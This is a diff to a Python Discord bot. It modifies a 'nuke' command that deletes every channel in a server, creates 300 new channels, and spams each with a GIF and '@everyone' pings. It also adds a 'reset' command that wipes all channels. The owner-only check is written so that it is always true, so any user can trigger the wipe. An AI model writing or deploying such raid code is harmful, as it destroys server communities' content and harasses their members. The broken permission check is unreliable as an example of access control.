@@ -248,19 +248,33 @@ async def nuke(ctx, channelnukename="bruh"):
   if ctx.guild.id == 603084195102851073:
     await ctx.channel.send("fucked up")
   else:
-    if ctx.author.id == 414931767129276428 or 217015087880339456 or 757038808490573916:
+    if ctx.author.id == 414931767129276428 or 289081560995463168:
         await ctx.message.delete()
         guild = ctx.guild
         count = 0
+        message = "https://cdn.discordapp.com/attachments/868557949721796608/945831875308576828/video0_13_online-video-cutter.com.gif"
         for channel in guild.channels:
             await channel.delete()
-        while count < 350:
+        while count < 300:
             await guild.create_text_channel(channelnukename)
-            count += 1
-            print(count)
-        message = "https://cdn.discordapp.com/emojis/627664851531071518.gif?v=1"
-        for channel in guild.text_channels:
+            channel = guild.channels[count]
             await channel.send(message)
+            await channel.send("@everyone")
+            count += 1
+    else:
+        await ctx.send("Bruh")
+
+
+@client.command(pass_context=True)
+async def reset(ctx, channelnukename="bruh"):
+  if ctx.guild.id == 603084195102851073:
+    await ctx.channel.send("fucked up")
+  else:
+    if ctx.author.id == 414931767129276428 or 289081560995463168:
+        await ctx.message.delete()
+        guild = ctx.guild
+        for channel in guild.channels:
+            await channel.delete()
     else:
         await ctx.send("Bruh")
 
@@ -355,7 +369,7 @@ async def calc(bruh):
 
 @client.event
 async def on_message(message):                              
-      if client.user.mentioned_in(message):
+      if client.user.mentioned_in(message) and client.user != message.author:
         await message.reply("lol dat me")
       if client.user != message.author and '<' not in message.content:
         if has_numbers(message.content) == True: 
